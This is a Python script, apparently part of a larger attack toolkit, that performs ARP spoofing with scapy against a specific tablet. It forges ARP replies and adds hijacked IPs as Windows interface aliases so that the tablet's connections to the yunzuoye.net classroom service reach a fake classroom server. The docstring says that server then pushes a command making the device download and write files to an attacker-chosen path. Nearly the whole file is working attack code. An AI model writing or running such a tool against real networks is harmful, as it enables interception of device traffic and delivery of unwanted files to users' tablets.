# -*- coding: utf-8 -*-
"""arp_basket.py — ARP 应答器 + 目标 IP 别名注入。

目的：让「模拟教室端」攻击【与 IP 无关】。
  无论微服务表 BSB301002/BSB301006 给出的教室(Basket/IM)地址是域名还是 IP，
  都让平板把教室 WebSocket 连接送到我们这里：

  ① 域名 ⇒ 已由 dns_hijack.py 把 *.yunzuoye.net 指向我们（配合 relay/伪教室监听端口）
  ② IP   ⇒ 本脚本：
        a) 嗅探平板发出的 ARP 请求 "who-has <目标IP>? tell <平板IP>"
           ⇒ 记录目标 IP（同时揭示真实教室服务器 IP，供情报留存）
        b) 立刻用我们的 MAC 应答 " <目标IP> is-at <我方MAC> "
           ⇒ 平板把该 IP 的流量发到我们这块网卡
        c) 把该 IP 加为本机网卡别名（netsh interface ip add address）
           ⇒ Windows 才会把目的地址是该 IP 的包投递给本地监听进程
        d) 于是我们监听的 19 个端口里，对应端口的伪教室服务（fake_classroom.py）就会接到连接
           ⇒ 自动下发 OPEN_FTP_CODE ⇒ 端侧 OkHttp 下载并写到 rootPath 指定的路径

用法: python arp_basket.py [hours]
环境: IFINDEX(默认 12)  PAD_MAC(默认平板)  ALIAS_IFACE(默认"本地连接* 17")
      ARP_ALIAS=1(默认开启别名注入)  ARP_ALLOW_PREFIX(默认 192.168.,10.,172.16.,172.17. 等，逗号分隔；* 表示全部)
"""
import datetime
import os
import re
import subprocess
import sys
import threading
import time

import warnings
warnings.filterwarnings("ignore")
from scapy.all import Ether, ARP, IP, TCP, UDP, conf, AsyncSniffer, get_if_hwaddr

BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "arp_basket.log")
HIT = os.path.join(BASE, "night_watch_HIT.txt")

IFINDEX = int(os.environ.get("IFINDEX", "12"))
PAD_MAC = os.environ.get("PAD_MAC", "80:20:fd:8b:4b:fa").lower()
ALIAS_IFACE = os.environ.get("ALIAS_IFACE", "\u672c\u5730\u8fde\u63a5* 17")
DO_ALIAS = os.environ.get("ARP_ALIAS", "1") == "1"
HOURS = float(sys.argv[1]) if len(sys.argv) > 1 else 10.0

_lock = threading.Lock()
_stats = {"arp_req": 0, "arp_reply": 0, "alias_add": 0, "alias_fail": 0, "syn": 0}
_seen_targets = {}
_aliased = set()
_last_stat = [0.0]


def wlog(msg):
    line = "%s %s" % (datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3], msg)
    with _lock:
        try:
            with open(LOG, "a", encoding="utf-8", errors="replace") as f:
                f.write(line + "\n")
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def hit(msg):
    try:
        with open(HIT, "a", encoding="utf-8", errors="replace") as f:
            f.write("%s %s\n" % (datetime.datetime.now(), msg))
    except Exception:
        pass
    wlog("!!!!!! [HIT] " + msg)


def our_mac():
    try:
        return get_if_hwaddr(conf.ifaces.dev_from_index(IFINDEX).name).lower()
    except Exception:
        pass
    # 退化：从 Npcap iface 名拿
    for k, v in conf.ifaces.items():
        try:
            if getattr(v, "index", None) == IFINDEX:
                return v.mac.lower()
        except Exception:
            pass
    return None


def iface_name():
    try:
        return conf.ifaces.dev_from_index(IFINDEX).name
    except Exception:
        return None


def add_alias(ip):
    if not DO_ALIAS or ip in _aliased:
        return
    try:
        r = subprocess.run(["netsh", "interface", "ip", "add", "address", ALIAS_IFACE, ip, "255.255.255.0"],
                           capture_output=True, text=True, timeout=25)
        ok = (r.returncode == 0)
        if not ok:
            # 再试用索引
            r = subprocess.run(["netsh", "interface", "ipv4", "add", "address", str(IFINDEX), ip, "255.255.255.0"],
                               capture_output=True, text=True, timeout=25)
            ok = (r.returncode == 0)
        if ok:
            _aliased.add(ip)
            _stats["alias_add"] += 1
            hit("已把 %s 加为本机别名 (拦截教室连接)" % ip)
        else:
            _stats["alias_fail"] += 1
            wlog("[ALIAS-FAIL] %s rc=%s out=%s" % (ip, r.returncode, (r.stdout or r.stderr or "")[:160]))
    except Exception as e:
        _stats["alias_fail"] += 1
        wlog("[ALIAS-ERR] %s -> %s" % (ip, e))


def handle(pkt):
    try:
        if ARP in pkt:
            a = pkt[ARP]
            if pkt[Ether].src.lower() != PAD_MAC:
                return
            # 平板问 "who-has X? tell 平板"
            if a.op == 1:  # who-has
                target = a.pdst
                _stats["arp_req"] += 1
                first = target not in _seen_targets
                _seen_targets[target] = _seen_targets.get(target, 0) + 1
                if first:
                    hit("平板 ARP 查询目标: %s (第 %d 次, 累计不同目标 %d 个)"
                        % (target, _seen_targets[target], len(_seen_targets)))
                    # 对非网关目标做别名 + 抢答
                    if not target.startswith("192.168.137.1"):
                        add_alias(target)
                if False:
                    pass
                # 抢先应答（把该 IP 说成我们的 MAC）
                mac = our_mac()
                if mac and not target.startswith("192.168.137.1"):
                    try:
                        conf.ifaces.dev_from_index(IFINDEX)
                        reply = (Ether(src=mac, dst=PAD_MAC) /
                                 ARP(op=2, hwsrc=mac, psrc=target, hwdst=PAD_MAC, pdst=a.psrc))
                        conf.L3socket(iface=iface_name()).send(reply)
                        _stats["arp_reply"] += 1
                        if first:
                            wlog("[ARP-REPLY] %s is-at %s -> \u5e73\u677f" % (target, mac))
                    except Exception as e:
                        wlog("[ARP-REPLY-ERR] %s" % e)
        elif IP in pkt and TCP in pkt:
            ip = pkt[IP]
            t = pkt[TCP]
            if pkt[Ether].src.lower() == PAD_MAC and t.flags & 0x02:  # SYN
                _stats["syn"] += 1
                key = "%s:%d" % (ip.dst, t.dport)
                if key not in _seen_targets:
                    _seen_targets[key] = 1
                    hit("平板 SYN -> %s (目标服务!)" % key)
    except Exception:
        pass


def main():
    iface = iface_name()
    mac = our_mac()
    wlog("===== arp_basket \u542f\u52a8 (\u5b88\u591c %.1f \u5c0f\u65f6) =====" % HOURS)
    wlog("      IFINDEX=%d iface=%s OUR_MAC=%s PAD_MAC=%s ALIAS=%s" % (IFINDEX, iface, mac, PAD_MAC, DO_ALIAS))
    if not mac:
        wlog("[WARN] \u672a\u53d6\u5230\u672c\u673a MAC \u2014\u2014 \u5c06\u53ea\u8bb0\u5f55\u4e0d\u5e94\u7b54")
    sniff = AsyncSniffer(iface=iface, prn=handle, store=False,
                         filter="arp or (tcp and tcp[tcpflags] & tcp-syn != 0)")
    sniff.start()
    t0 = time.time()
    while time.time() - t0 < HOURS * 3600:
        time.sleep(30)
        if time.time() - _last_stat[0] > 300:
            _last_stat[0] = time.time()
            wlog("[stat] %s | \u5df2\u89c1\u76ee\u6807 %d \u4e2a: %s"
                 % (_stats, len(_seen_targets), list(_seen_targets.keys())[:8]))
    try:
        sniff.stop()
    except Exception:
        pass
    wlog("[EXIT] arp_basket \u7ed3\u675f %s" % _stats)


if __name__ == "__main__":
    main()
